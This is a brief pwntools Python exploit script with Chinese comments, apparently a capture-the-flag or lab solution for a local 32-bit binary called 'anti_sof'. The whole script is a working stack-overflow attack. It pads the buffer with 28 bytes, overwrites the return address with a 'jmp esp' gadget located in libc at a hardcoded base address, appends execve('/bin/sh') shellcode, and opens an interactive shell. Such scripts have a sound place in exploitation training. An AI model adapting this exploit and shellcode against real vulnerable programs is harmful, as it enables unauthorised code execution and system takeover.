# -*- coding: utf-8 -*
from pwn import *

p = process('./anti_sof') # 运行程序
p.recvuntil("：") # 当遇到':'停止接收

# 查找libc.so.6，找到匹配“jmp esp”的汇编代码
libc = ELF('/lib32/libc.so.6')              
jmp_esp = asm('jmp esp') 
jmp_esp_offset = libc.search(jmp_esp).next()

libc_base = 0xf7ded000 # libc的加载地址
jmp_esp_addr = libc_base + jmp_esp_offset # 得到jmp_esp_addr

buf = '1'* 28 
buf += p32(jmp_esp_addr)
# “/bin/sh”
buf += '\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80'

p.sendline(buf) # 发送构造后的buf
p.interactive() # 进入交互